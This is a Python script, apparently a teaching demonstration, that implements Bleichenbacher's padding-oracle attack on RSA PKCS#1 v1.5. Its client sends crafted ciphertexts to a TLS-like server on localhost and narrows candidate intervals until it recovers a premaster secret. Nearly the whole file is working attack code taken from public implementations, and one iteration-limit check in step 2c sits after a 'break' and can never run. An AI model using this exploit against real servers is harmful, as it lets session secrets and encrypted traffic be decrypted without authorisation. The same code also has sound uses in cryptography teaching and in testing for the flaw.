import socket
import struct
import os
import time
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

TLS_HANDSHAKE = 0x16
TLS_ALERT = 0x15
TLS_APPLICATION_DATA = 0x17
TLS_VERSION = (3, 3)

def ceil_div(a, b):
    return -((-a) // b)

def floor_div(a, b):
    return a // b

class BleichenbacherClient:
    def __init__(self, server_host='localhost', server_port=4433):
        self.server_host = server_host
        self.server_port = server_port
        self.server_public_key = None
        self.n = None
        self.e = None
        self.load_server_public_key()

    def load_server_public_key(self):
        try:
            with open('server_public_key.pem', 'rb') as f:
                self.server_public_key = serialization.load_pem_public_key(
                    f.read(),
                    backend=default_backend()
                )
            self.n = self.server_public_key.public_numbers().n
            self.e = self.server_public_key.public_numbers().e
            print("[Client] Loaded server public key (n=%d, e=%d)" % (self.n, self.e))
        except Exception as e:
            print(f"[Client] Warning: Could not load server public key: {e}")

    def create_pkcs1_padding(self, message, key_size_bytes=256):
        # PKCS#1 padding from original client code
        if len(message) > key_size_bytes - 11:
            raise ValueError("Message too long")
        padding_length = key_size_bytes - len(message) - 3
        padding = bytes([0x00, 0x02])
        ps = os.urandom(padding_length)
        ps = bytes([b if b != 0 else 1 for b in ps])
        return padding + ps + b'\x00' + message

    def send_ciphertext(self, ciphertext):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.server_host, self.server_port))
                tls_header = struct.pack('!BBBH', TLS_HANDSHAKE,
                                       TLS_VERSION[0], TLS_VERSION[1],
                                       len(ciphertext))
                sock.send(tls_header + ciphertext)
                start_time = time.time()
                response = sock.recv(1024)
                elapsed_time = time.time() - start_time
                if len(response) >= 5:
                    msg_type = response[0]
                    if msg_type == TLS_ALERT:
                        return False, None, elapsed_time
                    elif msg_type == TLS_APPLICATION_DATA:
                        premaster = response[5:]  # Skip TLS header
                        return True, premaster, elapsed_time
                return False, None, elapsed_time
        except Exception as e:
            print(f"[Client] Connection error: {e}")
            return False, None, 0

    def bleichenbacher_attack(self, ciphertext, max_attempts=10000):
        #the structure inspired by alexandru-dinu/bleichenbacher (main.py)[](https://github.com/alexandru-dinu/bleichenbacher)[](https://github.com/alexandru-dinu/bleichenbacher/tree/master/src)
        #steps 1, 2a, 2b, 2c, 3 from jvdsn/crypto-attacks (bleichenbacher.py)[](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/rsa/bleichenbacher.py)
        #oracle and plaintext handling from emilyfane/rsa-bleichenbacher (attack.py)[](https://github.com/emilystamm/rsa-bleichenbacher/blob/master/attack.py)
        #simulation and key setup adapted from duesee/bleichenbacher (Bleichenbacher.py)[](https://github.com/duesee/bleichenbacher/blob/main/Bleichenbacher_Oracle/Oracle/Bleichenbacher.py)

        if not self.server_public_key:
            print("[Client] No server public key available")
            return None

        #initialize variables
        k = (self.n.bit_length() + 7) // 8  #modulus size in bytes
        B = 2 ** (8 * (k - 2))  #constant B from Bleichenbacher paper
        c = int.from_bytes(ciphertext, 'big')  #ciphertext as integer
        M = [(2 * B, 3 * B - 1)]  #initial interval M_0
        i = 1
        s0 = 1
        c0 = c
        calls_to_oracle = 0
        start_time = time.time()

        print("\n[Client] Starting Bleichenbacher attack")
        print(f"[Client] Modulus n={self.n}, e={self.e}, k={k} bytes")
        print(f"[Client] Initial interval M_0 = [{2*B}, {3*B-1}]")
        print(f"[Client] Ciphertext (int): {c}")

        #step 1: Find s0 such that c0 = c * s0^e mod n is PKCS#1 conforming
        #from jvdsn/crypto-attacks _step_1[](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/rsa/bleichenbacher.py)
        while not self.send_ciphertext(c0.to_bytes(k, 'big'))[0]:
            s0 = (s0 % self.n) + 1
            c0 = (c * pow(s0, self.e, self.n)) % self.n
            calls_to_oracle += 1
            if calls_to_oracle > max_attempts:
                print("[Client] Step 1 failed: No valid s0 found")
                return None
        print(f"[Client] Step 1: Found s0={s0}, c0={c0}")

        #step 2a: Find first s1 that produces a conforming plaintext
        s = ceil_div(self.n, 3 * B)
        while not self.send_ciphertext(((c0 * pow(s, self.e, self.n)) % self.n).to_bytes(k, 'big'))[0]:
            s += 1
            calls_to_oracle += 1
            if calls_to_oracle > max_attempts:
                print("[Client] Step 2a failed: No valid s1 found")
                return None
        print(f"[Client] Step 2a: Found s1={s}")

        #main attack loop
        while True:
            print(f"\n[Client] Iteration {i}")
            #step 2b/2c: Search for next s
            if len(M) > 1:
                #step 2b: Multiple intervals, increment s
                #jvdsn/crypto-attacks _step_2b[](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/rsa/bleichenbacher.py)
                s += 1
                while not self.send_ciphertext(((c0 * pow(s, self.e, self.n)) % self.n).to_bytes(k, 'big'))[0]:
                    s += 1
                    calls_to_oracle += 1
                    if calls_to_oracle > max_attempts:
                        print("[Client] Step 2b failed: No valid s found")
                        return None
                print(f"[Client] Step 2b: Found s={s}")
            else:
                #step 2c: Single interval, optimize search
                (a, b) = M[0]
                if a == b:
                    #solution found, recover plaintext
                    m = (a * pow(s0, -1, self.n)) % self.n
                    plaintext = m.to_bytes(k, 'big')
                    #decode plaintext as in emilyfane/rsa-bleichenbacher[](https://github.com/emilystamm/rsa-bleichenbacher/blob/master/attack.py)
                    try:
                        idx = plaintext.index(b'\x00', 2)
                        message = plaintext[idx + 1:].decode('utf-8', errors='ignore')
                        print(f"[Client] Success: Recovered plaintext: {message}")
                        print(f"[Client] Total oracle calls: {calls_to_oracle}")
                        print(f"[Client] Time taken: {time.time() - start_time:.2f}s")
                        return message
                    except:
                        print("[Client] Error decoding plaintext")
                        return None
                r = ceil_div(2 * (b * s - 2 * B), self.n)
                while True:
                    left = ceil_div(2 * B + r * self.n, b)
                    right = floor_div(3 * B + r * self.n, a)
                    for s_new in range(left, right + 1):
                        c_new = (c0 * pow(s_new, self.e, self.n)) % self.n
                        result, data, _ = self.send_ciphertext(c_new.to_bytes(k, 'big'))
                        calls_to_oracle += 1
                        if result:
                            s = s_new
                            if data:
                                print(f"[Client] CRITICAL: Exposed premaster secret in iteration {i}: {data.decode('utf-8', errors='ignore')}")
                            print(f"[Client] Step 2c: Found s={s}")
                            break
                    else:
                        r += 1
                        continue
                    break
                    if calls_to_oracle > max_attempts:
                        print("[Client] Step 2c failed: No valid s found")
                        return None

            #step 3: Update intervals
            #jvdsn/crypto-attacks _step_3 and duesee/bleichenbacher[](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/rsa/bleichenbacher.py)[](https://github.com/duesee/bleichenbacher/blob/main/Bleichenbacher_Oracle/Oracle/Bleichenbacher.py)
            M_new = []
            for (a, b) in M:
                r_min = ceil_div(a * s - 3 * B + 1, self.n)
                r_max = floor_div(b * s - 2 * B, self.n)
                for r in range(r_min, r_max + 1):
                    a_new = max(a, ceil_div(2 * B + r * self.n, s))
                    b_new = min(b, floor_div(3 * B - 1 + r * self.n, s))
                    if a_new <= b_new:
                        M_new.append((a_new, b_new))
            M = M_new
            print(f"[Client] Step 3: Updated intervals M = {M}")
            if not M:
                print("[Client] Error: No valid intervals remaining")
                return None
            i += 1
            if calls_to_oracle > max_attempts:
                print("[Client] Attack failed: Max oracle calls reached")
                return None

    def run(self):
        #create and encrypt a test ciphertext
        premaster_secret = b'\x03\x03' + os.urandom(46)
        padded_premaster = self.create_pkcs1_padding(premaster_secret)
        c = pow(int.from_bytes(padded_premaster, 'big'), self.e, self.n)
        ciphertext = c.to_bytes(256, 'big')

        print("=== Bleichenbacher Attack Client ===")
        print("WARNING: This is a demonstration of a dangerous cryptographic vulnerability!")
        time.sleep(1)

        #run the attack
        result = self.bleichenbacher_attack(ciphertext)
        if result:
            print(f"[Client] DEMONSTRATION SUCCESS: Sensitive data exposed: {result}")
        else:
            print("[Client] Attack failed, but padding oracle vulnerability was exploited")

if __name__ == "__main__":
    client = BleichenbacherClient()
    client.run()